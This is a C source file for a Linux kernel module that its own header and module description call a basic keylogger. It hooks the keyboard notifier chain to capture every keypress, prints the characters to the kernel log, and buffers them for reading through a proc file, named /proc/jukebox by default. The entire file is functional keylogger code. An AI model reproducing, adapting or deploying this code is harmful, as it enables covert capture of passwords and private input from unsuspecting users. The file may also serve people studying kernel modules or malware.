/* klogger.c -  Basic Implementation of a keylogger at kernel space */
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/keyboard.h>
#include <asm/uaccess.h>
#include "klogger.h"
#include "ringBuffer.c"

#define RING_BUFFER_SIZE 1024

static struct proc_dir_entry *proc_entry; /* structure that stores proc file information */

/* Module's input parameters */
static char *proc_filename = "jukebox";
static char *scan_code = "SET1";

module_param(proc_filename, charp, 0000);
MODULE_PARM_DESC(proc_filename, " Define a different name for your proc file. By default, it is /proc/jukebox.");
module_param(scan_code, charp, 0000);
MODULE_PARM_DESC(scan_code, " Select the most suitable scan code to your keyboard layout. Only RAW and SET1 (IBM PC XT) are available");

/** 
 * Handler responsable to read and log every key pressed by the user
 *
 */
int keyboard_listener(struct notifier_block *nblock, unsigned long code, void *_param) {
  struct keyboard_notifier_param *param = _param;

  if (code == KBD_KEYCODE && param->down) { // log only when user press the button, ignoring the release button action

#ifdef DEBUG
    printk(KERN_DEBUG "KEYLOGGER code=%lu value=%i down=%s shift=%i ledstate=%i\n",
		code,
		param->value, 
		(param->down ? "down" : "up"),
		param->shift,
		param->ledstate);
#endif
	
	if(strcmp(scan_code,"SET1")==0) {
		printk("%c",convertKeycode2Character(param->value,param->shift));
		add_ring_element(convertKeycode2Character(param->value,param->shift));
	} 
	else {
                printk("%i",param->value);
	}
  }

  return NOTIFY_OK;
}

/**
 * This function is called when the module is loaded
 *
 */
int init_proc_file()
{
        proc_entry = create_proc_entry(proc_filename, 0644, NULL );
        if(proc_entry == NULL)
        {
                printk(KERN_INFO "failed to create proc entry %s\n", proc_filename);
                return -ENOMEM;
        }
        proc_entry->read_proc = read_proc_file;
        printk(KERN_INFO "/proc/%s created\n", proc_filename);

        return 0;
}

/**
 * This function is called when the module is unloaded
 *
 */
void clear_proc_file()
{
        remove_proc_entry(proc_filename,proc_entry);
        printk(KERN_INFO "/proc/%s removed\n", proc_filename);
}


/**
 * This function is called then the /proc/<name> file is read
 *
 */
int read_proc_file(char *buffer,char **buffer_location,off_t offset, int buffer_length, int *eof, void *data)
{
	char* ringBufferData = get_ring_elements();
	int buffer_size = RING_BUFFER_SIZE;
	
        printk(KERN_INFO "read_proc_file (/proc/%s) called\n", proc_filename);

        if (offset > 0) {
                /* we have finished to read, return 0 */
                buffer_size  = 0;
        } else {
                /* fill the buffer, return the buffer size */
                memcpy(buffer, ringBufferData,buffer_size);
        }

        return buffer_size;
}

static int __init klogger_init(void)
{
  init_proc_file();
  initialize_ring_buffer(RING_BUFFER_SIZE);
  register_keyboard_notifier(&nb);
  printk(KERN_INFO "klogger registered and listening\n");

  return 0;
}

static void __exit klogger_exit(void)
{
  clear_proc_file();
  unregister_keyboard_notifier(&nb);
  printk(KERN_INFO "klogger unregistered\n");
}

module_init(klogger_init);
module_exit(klogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Carlos Andre");
MODULE_DESCRIPTION("A basic keylogger implementation.");
